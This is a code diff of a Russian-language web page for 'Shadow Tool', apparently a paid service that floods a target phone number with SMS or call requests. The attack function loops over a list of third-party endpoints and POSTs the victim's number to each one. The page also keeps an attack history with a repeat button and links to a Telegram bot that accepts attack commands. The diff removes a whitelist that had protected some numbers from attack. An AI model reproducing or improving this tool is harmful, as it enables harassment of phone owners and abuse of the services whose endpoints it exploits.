@@ -2,174 +2,421 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
     <title>Shadow Tool</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
+        @import url('https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;500&family=Roboto:wght@300;400;500;700&display=swap');
+
+        :root {
+            --primary-color: #000000;
+            --secondary-color: #ffffff;
+            --accent-color: #808080;
+            --bg-color: #000000;
+            --card-bg: rgba(0, 0, 0, 0.8);
+            --border-color: #ffffff;
+            --success-color: #4CAF50;
+            --error-color: #ff5555;
+        }
+
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
         body {
+            margin: 0;
+            padding: 15px;
             background: #000000;
-            font-family: 'Courier New', monospace;
+            color: var(--secondary-color);
+            font-family: 'Roboto', 'Segoe UI', sans-serif;
             min-height: 100vh;
+            overflow-x: hidden;
+        }
+
+        .star-field {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            pointer-events: none;
+        }
+        .star {
+            position: absolute;
+            background-color: white;
+            border-radius: 50%;
+        }
+        .star.big { animation: twinkle 3s infinite alternate; }
+        .star.medium { animation: twinkle 4s infinite alternate-reverse; }
+        .star.small { animation: twinkle 5s infinite alternate; }
+        @keyframes twinkle { 0%, 100% { opacity: 0.3; } 50% { opacity: 1; } }
+
+        @keyframes colorPulse {
+            0%, 100% { color: #ffffff; text-shadow: 0 0 10px rgba(255,255,255,0.3); }
+            50% { color: #e0e0e0; text-shadow: 0 0 20px rgba(255,255,255,0.7); }
+        }
+
+        @keyframes blackWhiteFlow {
+            0%, 100% { color: #ffffff; border-color: #ffffff; }
+            50% { color: #999999; border-color: #999999; }
+        }
+
+        .tabs {
             display: flex;
             justify-content: center;
-            align-items: center;
-            padding: 20px;
-            color: #ffffff;
+            margin-bottom: 25px;
+            gap: 8px;
+            flex-wrap: wrap;
         }
-        .container {
-            max-width: 500px;
-            width: 100%;
-            background: #0a0a0a;
-            border: 2px solid #00ff00;
-            border-radius: 15px;
-            padding: 25px;
-            box-shadow: 0 0 30px rgba(0,255,0,0.2);
-        }
-        h1 { color: #00ff00; text-align: center; font-size: 32px; margin-bottom: 8px; }
-        .version { text-align: center; color: #00cc00; font-size: 12px; margin-bottom: 20px; }
-        .tabs { display: flex; gap: 8px; margin-bottom: 20px; }
         .tab-btn {
-            flex: 1; background: #111111; border: 1px solid #00ff00; color: #00ff00;
-            padding: 12px; cursor: pointer; text-align: center; font-weight: bold;
+            background: #000000;
+            border: 1px solid var(--border-color);
+            color: var(--border-color);
+            padding: 12px 20px;
+            cursor: pointer;
+            transition: all 0.3s;
+            font-family: 'Roboto', sans-serif;
+            font-weight: 500;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            border-radius: 8px;
+            animation: blackWhiteFlow 8s ease-in-out infinite;
+        }
+        .tab-btn.active {
+            background: var(--border-color);
+            color: #000000;
+            animation: none;
+        }
+        .tab-content { display: none; animation: fadeIn 0.5s; }
+        .tab-content.active { display: block; }
+
+        .glitch-container { text-align: center; margin: 1.5em 0; }
+        .glitch {
+            font-size: 2.5em;
+            color: #ffffff;
+            animation: textFloat 6s ease-in-out infinite, colorPulse 4s ease-in-out infinite;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+        @keyframes textFloat { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-5px); } }
+        .author {
+            color: #ffffff;
+            font-size: 1em;
+            margin-top: 8px;
+            animation: subtleFlow 5s ease-in-out infinite;
+        }
+        @keyframes subtleFlow { 0%, 100% { opacity: 1; } 50% { opacity: 0.7; } }
+
+        .terminal {
+            max-width: 500px;
+            margin: 0 auto;
+            border: 1px solid var(--border-color);
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.85);
+            border-radius: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 14px;
+            background: #111111;
+            border: 1px solid var(--border-color);
+            color: #ffffff;
+            font-size: 16px;
+            margin: 10px 0;
             border-radius: 8px;
         }
-        .tab-btn.active { background: #00ff00; color: #000000; }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
-        input {
-            width: 100%; padding: 14px; background: #111111; border: 1px solid #00ff00;
-            color: #ffffff; font-size: 16px; margin: 10px 0; border-radius: 8px;
-        }
         button {
-            width: 100%; padding: 14px; background: #00ff00; border: none; color: #000000;
-            font-weight: bold; font-size: 16px; cursor: pointer; margin: 8px 0; border-radius: 8px;
+            width: 100%;
+            padding: 14px;
+            background: #00ff00;
+            border: none;
+            color: #000000;
+            font-weight: bold;
+            font-size: 16px;
+            cursor: pointer;
+            margin: 8px 0;
+            border-radius: 8px;
+            transition: 0.2s;
         }
-        button:hover { opacity: 0.85; }
+        button:hover { opacity: 0.85; transform: scale(0.98); }
         .logs {
-            height: 220px; overflow-y: auto; background: #050505; border: 1px solid #00ff00;
-            margin-top: 15px; padding: 12px; font-size: 12px; border-radius: 8px;
+            height: 220px;
+            overflow-y: auto;
+            background: #050505;
+            border: 1px solid #00ff00;
+            margin-top: 15px;
+            padding: 12px;
+            font-size: 12px;
+            border-radius: 8px;
         }
-        .log { color: #00ff00; border-left: 3px solid #00ff00; padding-left: 10px; margin: 8px 0; }
+        .log {
+            color: #00ff00;
+            border-left: 3px solid #00ff00;
+            padding-left: 10px;
+            margin: 8px 0;
+        }
         .error-log { border-left-color: #ff4444; color: #ff8888; }
+
         .status {
-            position: fixed; bottom: 15px; right: 15px; background: #000000;
-            border: 1px solid #00ff00; padding: 6px 12px; color: #00ff00; font-size: 11px;
+            position: fixed;
+            bottom: 15px;
+            right: 15px;
+            background: #000000;
+            border: 1px solid #00ff00;
+            padding: 6px 12px;
+            color: #00ff00;
+            font-size: 11px;
             border-radius: 20px;
+            font-weight: bold;
         }
-        .sub-info {
-            background: #111111; border: 1px solid #00ff00; border-radius: 8px;
-            padding: 12px; margin-top: 15px; text-align: center;
-        }
-        .sub-label { font-size: 11px; color: #00cc88; margin-bottom: 5px; }
-        .sub-days { font-size: 18px; font-weight: bold; color: #00ff00; }
-        .stats { display: flex; gap: 12px; margin-bottom: 20px; }
-        .stat-card {
-            flex: 1; background: #111111; border: 1px solid #00ff00; text-align: center;
-            padding: 12px; border-radius: 10px;
-        }
-        .stat-value { font-size: 28px; font-weight: bold; color: #00ff00; }
-        .stat-label { font-size: 11px; color: #00cc88; margin-top: 5px; }
-        .history-table { width: 100%; font-size: 12px; border-collapse: collapse; }
-        .history-table th, .history-table td { padding: 8px; border-bottom: 1px solid #333333; text-align: left; color: #ffffff; }
-        .history-table th { color: #00ff00; }
-        .action-btn {
-            background: #222222; border: 1px solid #00ff00; color: #00ff00;
-            padding: 4px 10px; cursor: pointer; border-radius: 5px;
-        }
+
         .profile-info {
-            background: #111111; padding: 20px; border-radius: 10px; border: 1px solid #00ff00;
+            background: #111111;
+            padding: 25px;
+            border-radius: 15px;
+            border: 1px solid #00ff00;
+            max-width: 400px;
+            margin: 0 auto;
         }
+        .profile-field {
+            margin: 15px 0;
+            padding: 12px;
+            background: #0a0a0a;
+            border-radius: 10px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 10px;
+        }
+        .profile-label {
+            color: #00ff00;
+            font-weight: bold;
+            text-transform: uppercase;
+            font-size: 12px;
+        }
+        .profile-value {
+            color: #ffffff;
+            font-family: monospace;
+            font-size: 14px;
+            word-break: break-all;
+            text-align: right;
+        }
+        .subscription-card {
+            background: linear-gradient(135deg, #0a2a0a, #0a0a0a);
+            border: 2px solid #00ff00;
+            border-radius: 15px;
+            padding: 20px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .subscription-days {
+            font-size: 36px;
+            font-weight: bold;
+            color: #00ff00;
+        }
+        .subscription-label {
+            font-size: 12px;
+            color: #00cc88;
+            margin-top: 5px;
+        }
+
+        .tutorial-step {
+            margin: 20px 0;
+            padding: 15px;
+            border-left: 3px solid #00ff00;
+            background: rgba(0,255,0,0.05);
+            border-radius: 10px;
+        }
+        .tutorial-step h3 { color: #00ff00; margin-top: 0; }
+        .tutorial-step p { color: #ffffff; }
+
+        .history-table { width: 100%; font-size: 12px; border-collapse: collapse; }
+        .history-table th, .history-table td { padding: 8px; border-bottom: 1px solid #333; text-align: left; color: #fff; }
+        .history-table th { color: #00ff00; }
+        .stats {
+            display: flex;
+            gap: 12px;
+            margin-bottom: 20px;
+            flex-wrap: wrap;
+        }
+        .stat-card {
+            flex: 1;
+            background: #111;
+            border: 1px solid #00ff00;
+            text-align: center;
+            padding: 12px;
+            border-radius: 10px;
+            min-width: 100px;
+        }
+        .stat-value { font-size: 24px; font-weight: bold; color: #00ff00; }
+        .stat-label { font-size: 10px; color: #00cc88; }
+        .action-btn {
+            background: #222;
+            border: 1px solid #00ff00;
+            color: #00ff00;
+            padding: 4px 10px;
+            cursor: pointer;
+            border-radius: 5px;
+            width: auto;
+            display: inline-block;
+            margin: 0 2px;
+        }
+
         .bind-code {
-            background: #000000; padding: 12px; text-align: center; font-size: 22px;
-            letter-spacing: 4px; border: 1px solid #00ff00; border-radius: 8px;
+            background: #000;
+            padding: 12px;
+            text-align: center;
+            font-size: 22px;
+            letter-spacing: 4px;
+            border: 1px solid #00ff00;
+            border-radius: 8px;
+            font-family: monospace;
         }
+
         @media (max-width: 500px) {
-            .container { padding: 18px; }
-            h1 { font-size: 24px; }
+            .glitch { font-size: 1.8em; }
+            .profile-field { flex-direction: column; text-align: center; }
+            .profile-value { text-align: center; }
         }
     </style>
 </head>
 <body>
-<div class="container" id="app">
-    <h1>⚡ SHADOW TOOL</h1>
-    <div class="version">v3.0</div>
+<div class="star-field" id="starField"></div>
 
-    <div id="authForms">
-        <div id="loginForm">
-            <input type="text" id="loginLogin" placeholder="Логин">
-            <input type="password" id="loginPassword" placeholder="Пароль">
-            <button onclick="doLogin()">ВОЙТИ</button>
-            <p style="text-align:center; margin-top:12px;">Нет аккаунта? <a href="#" onclick="showRegister()">Регистрация</a></p>
-        </div>
-        <div id="registerForm" style="display:none">
-            <input type="text" id="regLogin" placeholder="Логин">
-            <input type="password" id="regPassword" placeholder="Пароль">
-            <button onclick="doRegister()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
-            <p style="text-align:center; margin-top:12px;">Уже есть аккаунт? <a href="#" onclick="showLogin()">Войти</a></p>
-        </div>
+<!-- Формы авторизации -->
+<div id="authForms" style="max-width:400px; margin:0 auto;">
+    <div id="loginForm" style="background:#0a0a0a; padding:25px; border-radius:15px; border:1px solid #00ff00;">
+        <h2 style="color:#00ff00; text-align:center;">🔐 ВХОД</h2>
+        <input type="text" id="loginLogin" placeholder="Логин">
+        <input type="password" id="loginPassword" placeholder="Пароль">
+        <button onclick="doLogin()">ВОЙТИ</button>
+        <p style="text-align:center; margin-top:12px;">Нет аккаунта? <a href="#" onclick="showRegister()" style="color:#00ff00;">Регистрация</a></p>
         <div id="authError" style="color:#ff4444; text-align:center; margin-top:12px;"></div>
+    </div>
+    <div id="registerForm" style="display:none; background:#0a0a0a; padding:25px; border-radius:15px; border:1px solid #00ff00;">
+        <h2 style="color:#00ff00; text-align:center;">📝 РЕГИСТРАЦИЯ</h2>
+        <input type="text" id="regLogin" placeholder="Логин">
+        <input type="password" id="regPassword" placeholder="Пароль">
+        <button onclick="doRegister()">ЗАРЕГИСТРИРОВАТЬСЯ</button>
+        <p style="text-align:center; margin-top:12px;">Уже есть аккаунт? <a href="#" onclick="showLogin()" style="color:#00ff00;">Войти</a></p>
         <div id="authSuccess" style="color:#00ff44; text-align:center; margin-top:12px;"></div>
     </div>
+</div>
 
-    <div id="mainContent" style="display:none;">
-        <div class="tabs">
-            <div class="tab-btn active" onclick="switchTab('attack')">АТАКА</div>
-            <div class="tab-btn" onclick="switchTab('history')">ИСТОРИЯ</div>
-            <div class="tab-btn" onclick="switchTab('profile')">ПРОФИЛЬ</div>
-        </div>
+<!-- Основной контент -->
+<div id="mainContent" style="display:none;">
+    <div class="glitch-container">
+        <div class="glitch">⚡ SHADOW TOOL</div>
+        <div class="author">by Amnesia</div>
+    </div>
 
-        <div id="attackTab" class="tab-content active">
+    <div class="tabs">
+        <button class="tab-btn active" onclick="switchTab('attack')">АТАКА</button>
+        <button class="tab-btn" onclick="switchTab('history')">ИСТОРИЯ</button>
+        <button class="tab-btn" onclick="switchTab('profile')">ПРОФИЛЬ</button>
+        <button class="tab-btn" onclick="switchTab('tutorial')">ТУТОРИАЛ</button>
+    </div>
+
+    <!-- АТАКА -->
+    <div id="attackTab" class="tab-content active">
+        <div class="terminal">
             <input type="text" id="phone" placeholder="+79001234567">
             <button onclick="startAttack()">НАЧАТЬ АТАКУ</button>
-            <div class="sub-info">
-                <div class="sub-label">ДО ОКОНЧАНИЯ ПОДПИСКИ</div>
-                <div class="sub-days" id="subDaysLeft">—</div>
-            </div>
             <div class="logs" id="logs"></div>
         </div>
+    </div>
 
-        <div id="historyTab" class="tab-content">
+    <!-- ИСТОРИЯ -->
+    <div id="historyTab" class="tab-content">
+        <div style="max-width:600px; margin:0 auto;">
             <div class="stats">
                 <div class="stat-card"><div class="stat-value" id="totalCount">0</div><div class="stat-label">АТАК</div></div>
                 <div class="stat-card"><div class="stat-value" id="successRate">0%</div><div class="stat-label">УСПЕШНО</div></div>
             </div>
-            <button onclick="clearHistory()">ОЧИСТИТЬ ИСТОРИЮ</button>
-            <div style="overflow-x:auto; margin-top:15px;">
+            <button onclick="clearHistory()" style="margin-bottom:15px;">ОЧИСТИТЬ ИСТОРИЮ</button>
+            <div style="overflow-x:auto;">
                 <table class="history-table">
                     <thead><tr><th>Время</th><th>Номер</th><th>Статус</th><th></th></tr></thead>
                     <tbody id="historyBody"></tbody>
                 </table>
             </div>
         </div>
+    </div>
 
-        <div id="profileTab" class="tab-content">
-            <div class="profile-info">
-                <h3 style="color:#00ff00; margin-bottom:15px;">👤 ПРОФИЛЬ</h3>
-                <div style="margin-bottom:20px;">
-                    <p><strong style="color:#00ff00;">Логин:</strong> <span id="profileLogin">—</span></p>
-                    <p><strong style="color:#00ff00;">Подписка:</strong> <span id="profileSub">—</span></p>
-                    <p><strong style="color:#00ff00;">Действует до:</strong> <span id="profileExpires">—</span></p>
+    <!-- ПРОФИЛЬ (с подпиской) -->
+    <div id="profileTab" class="tab-content">
+        <div class="profile-info">
+            <div class="profile-field">
+                <span class="profile-label">👤 ЛОГИН</span>
+                <span class="profile-value" id="profileLogin">—</span>
+            </div>
+            <div class="subscription-card">
+                <div class="subscription-days" id="profileDaysLeft">—</div>
+                <div class="subscription-label">ДНЕЙ ПОДПИСКИ ОСТАЛОСЬ</div>
+                <div class="profile-field" style="margin-top:15px;">
+                    <span class="profile-label">📅 ДЕЙСТВУЕТ ДО</span>
+                    <span class="profile-value" id="profileExpires">—</span>
                 </div>
-                <hr style="border-color:#00ff00; margin:15px 0;">
-                <h4 style="color:#00ff00; margin-bottom:10px;">🤖 ПРИВЯЗКА TELEGRAM</h4>
-                <p style="margin-bottom:10px;">Привяжите Telegram, чтобы управлять атаками через бота</p>
-                <button onclick="generateBindCode()" style="background:#00ff00; color:#000; width:auto; padding:10px 20px;">📱 ПОЛУЧИТЬ КОД</button>
-                <div id="bindCodeDisplay" style="display:none; margin-top:15px; padding:15px; background:#0a0a0a; border-radius:8px;">
-                    <p style="margin-bottom:8px;">Ваш код для привязки:</p>
-                    <div class="bind-code" id="bindCode"></div>
-                    <p style="margin-top:12px; font-size:12px;">Отправьте этот код боту: <code>/bind КОД</code></p>
-                    <p style="font-size:11px; color:#888;">Код действителен 5 минут</p>
-                </div>
-                <div id="bindStatus" style="margin-top:15px; padding:10px; background:#0a0a0a; border-radius:8px; font-size:12px;">
-                    <span style="color:#888;">Загружаем статус привязки...</span>
-                </div>
+            </div>
+            
+            <hr style="border-color:#00ff00; margin:20px 0;">
+            
+            <h4 style="color:#00ff00; text-align:center;">🤖 ПРИВЯЗКА TELEGRAM</h4>
+            <p style="text-align:center; font-size:12px;">Привяжите Telegram, чтобы управлять атаками через бота</p>
+            <button onclick="generateBindCode()" style="background:#00ff00; color:#000;">📱 ПОЛУЧИТЬ КОД</button>
+            <div id="bindCodeDisplay" style="display:none; margin-top:15px; padding:15px; background:#0a0a0a; border-radius:8px;">
+                <p style="margin-bottom:8px;">Ваш код:</p>
+                <div class="bind-code" id="bindCode"></div>
+                <p style="margin-top:12px; font-size:12px;">Отправьте боту: <code>/bind КОД</code></p>
+            </div>
+            <div id="bindStatus" style="margin-top:15px; padding:10px; background:#0a0a0a; border-radius:8px; font-size:12px; text-align:center;">
+                <span style="color:#888;">Загрузка...</span>
             </div>
         </div>
     </div>
-    <div class="status" id="status">ЗАГРУЗКА...</div>
+
+    <!-- ТУТОРИАЛ -->
+    <div id="tutorialTab" class="tab-content">
+        <div style="max-width:500px; margin:0 auto;">
+            <div class="tutorial-step">
+                <h3>📌 ШАГ 1: Регистрация</h3>
+                <p>Создайте аккаунт на сайте — введите логин и пароль, затем войдите.</p>
+            </div>
+            <div class="tutorial-step">
+                <h3>🔗 ШАГ 2: Привязка Telegram</h3>
+                <p>Перейдите в ПРОФИЛЬ → нажмите «Получить код» → отправьте код боту командой <code>/bind КОД</code></p>
+            </div>
+            <div class="tutorial-step">
+                <h3>🎯 ШАГ 3: Атака</h3>
+                <p>Введите номер телефона и нажмите «Начать атаку». Или используйте команду бота <code>/a НОМЕР</code></p>
+            </div>
+            <div class="tutorial-step">
+                <h3>💎 ШАГ 4: Подписка</h3>
+                <p>Для использования инструмента необходима подписка. Обратитесь к администратору.</p>
+            </div>
+            <div class="tutorial-step" style="border-left-color:#ff4444;">
+                <h3 style="color:#ff4444;">⚠️ ВНИМАНИЕ</h3>
+                <p>Используйте инструмент только для тестирования своих систем. Несанкционированное использование запрещено.</p>
+            </div>
+        </div>
+    </div>
+
+    <div class="status" id="status">⏳ ЗАГРУЗКА...</div>
 </div>
 
 <script>
+    // Telegram Mini App
+    if (window.Telegram && window.Telegram.WebApp) {
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.ready();
+        tg.BackButton.show();
+        tg.BackButton.onClick(function() { tg.close(); });
+    }
+
     const API_BASE = 'https://use-production-80e9.up.railway.app';
     
     const ATTACK_URLS = [
@@ -190,38 +437,11 @@
     let currentSubscription = false;
     let subscriptionExpires = null;
 
-    // ========== НОРМАЛИЗАЦИЯ НОМЕРА ДЛЯ САЙТА ==========
-    function normalizePhoneForCheck(phone) {
-        let digits = phone.replace(/\D/g, '');
-        if (!digits) return null;
-        if (digits.startsWith('8')) digits = '7' + digits.slice(1);
-        if (digits.startsWith('7') && digits.length === 11) return '+' + digits;
-        if (digits.startsWith('9') && digits.length === 10) return '+7' + digits;
-        return digits;
-    }
-
-    async function isPhoneWhitelisted(phone) {
-        const normalized = normalizePhoneForCheck(phone);
-        if (!normalized) return false;
-        try {
-            const res = await fetch(API_BASE + '/is_whitelisted', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: phone })
-            });
-            const data = await res.json();
-            return data.blocked === true;
-        } catch(e) {
-            return false;
-        }
-    }
-
     // ========== АВТОРИЗАЦИЯ ==========
     async function doRegister() {
         const login = document.getElementById('regLogin').value;
         const password = document.getElementById('regPassword').value;
         if (!login || !password) { showAuthError('Заполните все поля'); return; }
-        showAuthError(''); showAuthSuccess('');
         try {
             const res = await fetch(API_BASE + '/register', {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -240,7 +460,6 @@
         const login = document.getElementById('loginLogin').value;
         const password = document.getElementById('loginPassword').value;
         if (!login || !password) { showAuthError('Заполните все поля'); return; }
-        showAuthError('');
         try {
             const res = await fetch(API_BASE + '/login', {
                 method: 'POST', headers: { 'Content-Type': 'application/json' },
@@ -272,34 +491,42 @@
             subscriptionExpires = subData.expires_at;
             showApp();
             updateHistoryDisplay();
-            updateSubscriptionDisplay();
-            const bindStatusDiv = document.getElementById('bindStatus');
-            if (bindStatusDiv) {
-                if (meData.telegram_bound) bindStatusDiv.innerHTML = '<span style="color:#00ff00;">✅ Telegram привязан! Используйте /a в боте</span>';
-                else bindStatusDiv.innerHTML = '<span style="color:#ffaa00;">⚠️ Telegram не привязан. Получите код выше.</span>';
-            }
-            document.getElementById('status').innerHTML = currentSubscription ? 'ГОТОВ' : 'НЕТ ПОДПИСКИ';
+            updateProfile();
+            document.getElementById('status').innerHTML = 'ГОТОВ';
         } catch(e) { showAuth(); }
     }
 
-    function updateSubscriptionDisplay() {
-        const subDaysSpan = document.getElementById('subDaysLeft');
-        if (!subDaysSpan) return;
-        if (!currentSubscription || !subscriptionExpires) {
-            subDaysSpan.innerHTML = 'Нет подписки';
-            subDaysSpan.style.color = '#ff8888';
-            return;
-        }
-        const now = new Date();
-        const expireDate = new Date(subscriptionExpires);
-        const diffDays = Math.ceil((expireDate - now) / (1000 * 60 * 60 * 24));
-        if (diffDays <= 0) {
-            subDaysSpan.innerHTML = 'Истекла';
-            subDaysSpan.style.color = '#ff8888';
-        } else {
-            subDaysSpan.innerHTML = diffDays + ' дн.';
-            subDaysSpan.style.color = '#00ff00';
-        }
+    async function updateProfile() {
+        const token = localStorage.getItem('token');
+        if (!token) return;
+        try {
+            const res = await fetch(API_BASE + '/me', {
+                headers: { 'Authorization': 'Bearer ' + token }
+            });
+            const data = await res.json();
+            if (data.id) {
+                document.getElementById('profileLogin').innerText = data.login;
+                const subRes = await fetch(API_BASE + '/check_subscription', {
+                    headers: { 'Authorization': 'Bearer ' + token }
+                });
+                const subData = await subRes.json();
+                if (subData.has_access && subData.expires_at) {
+                    const expireDate = new Date(subData.expires_at);
+                    const daysLeft = Math.ceil((expireDate - new Date()) / (1000*60*60*24));
+                    document.getElementById('profileDaysLeft').innerHTML = daysLeft > 0 ? daysLeft : '0';
+                    document.getElementById('profileExpires').innerHTML = expireDate.toLocaleDateString();
+                    document.getElementById('profileDaysLeft').style.color = daysLeft > 7 ? '#00ff00' : (daysLeft > 3 ? '#ffaa00' : '#ff4444');
+                } else {
+                    document.getElementById('profileDaysLeft').innerHTML = 'НЕТ';
+                    document.getElementById('profileExpires').innerHTML = '—';
+                }
+                if (data.telegram_bound) {
+                    document.getElementById('bindStatus').innerHTML = '<span style="color:#00ff00;">✅ Telegram привязан</span>';
+                } else {
+                    document.getElementById('bindStatus').innerHTML = '<span style="color:#ffaa00;">⚠️ Telegram не привязан</span>';
+                }
+            }
+        } catch(e) { console.error(e); }
     }
 
     function showAuth() {
@@ -307,8 +534,6 @@
         document.getElementById('mainContent').style.display = 'none';
         document.getElementById('loginForm').style.display = 'block';
         document.getElementById('registerForm').style.display = 'none';
-        document.getElementById('authError').innerText = '';
-        document.getElementById('authSuccess').innerText = '';
     }
 
     function showApp() {
@@ -322,52 +547,33 @@
         document.getElementById('loginForm').style.display = 'none';
         document.getElementById('registerForm').style.display = 'block';
         document.getElementById('authError').innerText = '';
-        document.getElementById('authSuccess').innerText = '';
     }
     function showLogin() {
         document.getElementById('registerForm').style.display = 'none';
         document.getElementById('loginForm').style.display = 'block';
         document.getElementById('authError').innerText = '';
-        document.getElementById('authSuccess').innerText = '';
     }
 
     // ========== АТАКА ==========
     async function startAttack() {
-        if (!currentSubscription) {
-            addLog('У ВАС НЕТ АКТИВНОЙ ПОДПИСКИ!', true);
-            return;
-        }
+        if (!currentSubscription) { addLog('⛔ НЕТ АКТИВНОЙ ПОДПИСКИ!', true); return; }
         const phone = document.getElementById('phone').value.trim();
-        document.getElementById('logs').innerHTML = '';
-        if (!phone) { addLog('Введите номер телефона', true); return; }
+        if (!phone) { addLog('❌ Введите номер', true); return; }
+        const phoneRegex = /^(\+?[78]\d{10}$)|^(\+380\d{9}$)/;
+        if (!phoneRegex.test(phone.replace(/\s+/g, ''))) { addLog('❌ Неверный формат', true); return; }
         
-        addLog('Проверка белого списка...');
-        if (await isPhoneWhitelisted(phone)) {
-            addLog('⛔ Номер в белом списке. Атака заблокирована.', true);
-            return;
-        }
-        
-        addLog(`🚀 Начинаю атаку на ${phone}`);
+        addLog(`🚀 Атака на ${phone}...`);
         document.getElementById('status').innerHTML = 'АТАКА...';
         let success = 0;
         for (let i = 0; i < ATTACK_URLS.length; i++) {
             try {
-                await fetch(ATTACK_URLS[i], {
-                    method: 'POST', mode: 'no-cors',
-                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
-                    body: `phone=${encodeURIComponent(phone)}`
-                });
+                await fetch(ATTACK_URLS[i], { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: `phone=${encodeURIComponent(phone)}` });
                 success++;
                 addLog(`✅ Запрос ${i+1}/${ATTACK_URLS.length} отправлен`);
-            } catch(e) {
-                addLog(`⚠️ Запрос ${i+1}/${ATTACK_URLS.length}: ошибка`, true);
-            }
+            } catch(e) { addLog(`⚠️ Запрос ${i+1}/${ATTACK_URLS.length}: ошибка`, true); }
             await new Promise(r => setTimeout(r, 100));
         }
-        attackHistory.unshift({
-            id: Date.now(), timestamp: new Date().toISOString(),
-            phone: phone, success: success, total: ATTACK_URLS.length
-        });
+        attackHistory.unshift({ id: Date.now(), timestamp: new Date().toISOString(), phone: phone, success: success, total: ATTACK_URLS.length });
         if (attackHistory.length > 30) attackHistory.pop();
         localStorage.setItem('shadow_history', JSON.stringify(attackHistory));
         addLog(`🎯 АТАКА ЗАВЕРШЕНА! Успешно: ${success}/${ATTACK_URLS.length}`);
@@ -391,107 +597,52 @@
         document.getElementById('successRate').innerText = successRate + '%';
         const tbody = document.getElementById('historyBody');
         if (!tbody) return;
-        if (total === 0) {
-            tbody.innerHTML = '<tr><td colspan="4" style="color:#888; text-align:center;">История атак пуста</td></tr>';
-            return;
-        }
-        tbody.innerHTML = attackHistory.map(h => `
-            <tr>
-                <td style="color:#ffffff;">${new Date(h.timestamp).toLocaleTimeString()}</td>
-                <td style="color:#00ff00;">${h.phone}</td>
-                <td style="color: ${h.success === h.total ? '#00ff00' : '#ff8888'}">${h.success}/${h.total}</td>
-                <td><button class="action-btn" onclick="repeatAttack('${h.phone}')">↺</button></td>
-            </tr>
-        `).join('');
+        if (total === 0) { tbody.innerHTML = '<tr><td colspan="4" style="color:#888; text-align:center;">История пуста</td></tr>'; return; }
+        tbody.innerHTML = attackHistory.map(h => `<tr><td>${new Date(h.timestamp).toLocaleTimeString()}</td><td style="color:#00ff00;">${h.phone}</td><td style="color:${h.success === h.total ? '#0f0' : '#f66'}">${h.success}/${h.total}</td><td><button class="action-btn" onclick="repeatAttack('${h.phone}')">↺</button></td></tr>`).join('');
     }
 
-    function repeatAttack(phone) {
-        document.getElementById('phone').value = phone;
-        switchTab('attack');
-        setTimeout(() => startAttack(), 500);
-    }
-
-    function clearHistory() {
-        if (confirm('Очистить всю историю?')) {
-            attackHistory = [];
-            localStorage.setItem('shadow_history', JSON.stringify(attackHistory));
-            updateHistoryDisplay();
-        }
-    }
-
-    async function loadProfile() {
-        const token = localStorage.getItem('token');
-        if (!token) return;
-        try {
-            const res = await fetch(API_BASE + '/me', {
-                headers: { 'Authorization': 'Bearer ' + token }
-            });
-            const data = await res.json();
-            if (data.id) {
-                document.getElementById('profileLogin').innerText = data.login;
-                const subRes = await fetch(API_BASE + '/check_subscription', {
-                    headers: { 'Authorization': 'Bearer ' + token }
-                });
-                const subData = await subRes.json();
-                if (subData.has_access) {
-                    const days = subData.plan ? subData.plan.replace('_days', '') : '?';
-                    document.getElementById('profileSub').innerHTML = `<span style="color:#00ff00;">✅ Активна (${days} дн.)</span>`;
-                    if (subData.expires_at) {
-                        const expireDate = new Date(subData.expires_at);
-                        document.getElementById('profileExpires').innerHTML = expireDate.toLocaleDateString();
-                    }
-                } else {
-                    document.getElementById('profileSub').innerHTML = '<span style="color:#ff8888;">❌ Нет подписки</span>';
-                    document.getElementById('profileExpires').innerHTML = '—';
-                }
-                if (data.telegram_bound) {
-                    document.getElementById('bindStatus').innerHTML = '<span style="color:#00ff00;">✅ Telegram привязан! Используйте /a в боте</span>';
-                } else {
-                    document.getElementById('bindStatus').innerHTML = '<span style="color:#ffaa00;">⚠️ Telegram не привязан. Получите код выше.</span>';
-                }
-            }
-        } catch(e) { console.error('Profile load error:', e); }
-    }
+    function repeatAttack(phone) { document.getElementById('phone').value = phone; switchTab('attack'); setTimeout(() => startAttack(), 500); }
+    function clearHistory() { if (confirm('Очистить историю?')) { attackHistory = []; localStorage.setItem('shadow_history', JSON.stringify(attackHistory)); updateHistoryDisplay(); } }
 
     async function generateBindCode() {
         const token = localStorage.getItem('token');
         if (!token) { alert('Вы не авторизованы'); return; }
         try {
-            const res = await fetch(API_BASE + '/generate_bind_code', {
-                method: 'POST', headers: { 'Authorization': 'Bearer ' + token }
-            });
+            const res = await fetch(API_BASE + '/generate_bind_code', { method: 'POST', headers: { 'Authorization': 'Bearer ' + token } });
             const data = await res.json();
             if (data.code) {
                 document.getElementById('bindCode').innerText = data.code;
                 document.getElementById('bindCodeDisplay').style.display = 'block';
-                document.getElementById('bindStatus').innerHTML = '<span style="color:#00ff00;">✅ Код сгенерирован! Отправьте его боту: /bind ' + data.code + '</span>';
-            } else {
-                document.getElementById('bindStatus').innerHTML = '<span style="color:#ff4444;">❌ Ошибка: ' + (data.error || 'неизвестно') + '</span>';
-            }
-        } catch(e) {
-            document.getElementById('bindStatus').innerHTML = '<span style="color:#ff4444;">❌ Ошибка соединения</span>';
-        }
